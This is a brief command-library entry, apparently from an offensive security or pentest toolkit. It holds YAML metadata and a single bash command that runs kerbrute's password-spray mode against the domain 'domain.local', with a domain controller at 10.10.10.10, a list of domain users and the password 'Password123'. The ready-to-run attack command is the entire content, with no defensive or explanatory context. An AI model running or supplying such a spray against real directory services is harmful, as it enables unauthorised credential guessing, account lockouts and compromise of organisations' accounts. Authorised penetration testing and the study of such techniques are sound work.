---
id: 28f22e5c-1f87-469e-8fff-8d4e2ce1d460
name: Kerbrute Password Spray with domain_users.txt and Password123
type: command
executor: bash
data: ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt
  Password123
output: null
created_at: '2023-04-06T03:56:04.255541+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
---

# Kerbrute Password Spray with domain_users.txt and Password123

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
```


